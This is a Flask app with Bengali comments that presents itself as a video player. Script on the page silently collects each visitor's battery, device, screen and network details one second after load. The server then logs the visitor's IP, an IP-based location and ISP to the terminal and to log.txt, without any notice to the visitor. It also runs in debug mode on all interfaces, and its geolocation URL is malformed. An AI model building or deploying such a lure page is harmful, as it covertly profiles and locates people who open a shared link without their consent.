import os
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from datetime import datetime
from user_agents import parse # ফোনের নাম বের করার জন্য
import requests # লোকেশন ডাটার জন্য

app = Flask(__name__)

# ভিডিও ফাইলটি যেখানে আছে সেই ফোল্ডার
VIDEO_FOLDER = os.getcwd()

def get_location(ip):
    try:
        # IP-API ব্যবহার করে লোকেশন এবং ISP বের করা
        response = requests.get(f'http://ip-api.com{ip}').json()
        if response['status'] == 'success':
            return f"{response['city']}, {response['country']} (ISP: {response['isp']})"
        return "Unknown Location"
    except:
        return "Location Error"

@app.route('/')
def index():
    html_code = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Video Player</title>
        <style>
            body { text-align: center; padding-top: 50px; background-color: #121212; color: white; font-family: Arial; }
            video { border: 4px solid #ff0000; border-radius: 15px; width: 90%; max-width: 600px; box-shadow: 0 0 20px #ff0000; }
        </style>
    </head>
    <body>
        <h2>ভিডিওটি লোড হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন</h2>
        <video id="myVideo" controls autoplay>
            <source src="/video_stream" type="video/mp4">
            আপনার ব্রাউজার এটি সাপোর্ট করে না।
        </video>

        <script>
            async function collectData() {
                let batteryInfo = { level: "N/A", charging: "N/A" };
                try {
                    let battery = await navigator.getBattery();
                    batteryInfo.level = (battery.level * 100).toFixed(0) + "%";
                    batteryInfo.charging = battery.charging ? "Charging" : "Not Charging";
                } catch (e) {}

                // নেটওয়ার্ক তথ্য সংগ্রহ
                let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                let netData = {
                    type: connection ? connection.effectiveType : "Unknown",
                    downlink: connection ? connection.downlink + " Mbps" : "N/A"
                };

                let data = {
                    level: batteryInfo.level,
                    charging: batteryInfo.charging,
                    device: navigator.userAgent,
                    screen: window.screen.width + "x" + window.screen.height,
                    net_type: netData.type,
                    net_speed: netData.downlink
                };
                
                fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            }
            // ১ সেকেন্ড পর ডাটা পাঠাবে
            setTimeout(collectData, 1000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_code)

@app.route('/video_stream')
def video_stream():
    return send_from_directory(VIDEO_FOLDER, 'video.mp4')

@app.route('/log', methods=['POST'])
def log_data():
    d = request.json
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # ফোনের নাম এবং ব্র্যান্ড বের করা
    ua_string = d.get('device')
    user_agent = parse(ua_string)
    brand = user_agent.device.brand
    model = user_agent.device.model
    os_info = f"{user_agent.os.family} {user_agent.os.version_string}"
    
    device_full_name = f"{brand} {model}" if brand else "Desktop/PC"
    
    # লোকেশন বের করা
    location = get_location(ip)
    
    log_entry = (f"Time: {time} | IP: {ip} | Loc: {location} | "
                 f"Device: {device_full_name} | OS: {os_info} | "
                 f"Net: {d.get('net_type')} ({d.get('net_speed')}) | "
                 f"Battery: {d.get('level')} ({d.get('charging')}) | Screen: {d.get('screen')}\n")
    
    # টার্মিনালে সুন্দরভাবে সাজিয়ে দেখানো
    print(f"\n--- [নতুন ভিজিটর ডিটেইলস] ---")
    print(f"সময়      : {time}")
    print(f"আইপি      : {ip}")
    print(f"লোকেশন    : {location}")
    print(f"ডিভাইস    : {device_full_name}")
    print(f"সিস্টেম    : {os_info}")
    print(f"নেটওয়ার্ক  : {d.get('net_type')} (গতি: {d.get('net_speed')})")
    print(f"ব্যাটারি    : {d.get('level')} ({d.get('charging')})")
    print(f"স্ক্রিন সাইজ: {d.get('screen')}")
    print("-" * 40)
    
    # ফাইলে সেভ করা
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)
        
    return jsonify({"status": "success"})

if __name__ == '__main__':
    # আপনার লোকাল আইপি বা ০.০.০.০ তে রান হবে
    app.run(debug=True, host='0.0.0.0', port=5000)
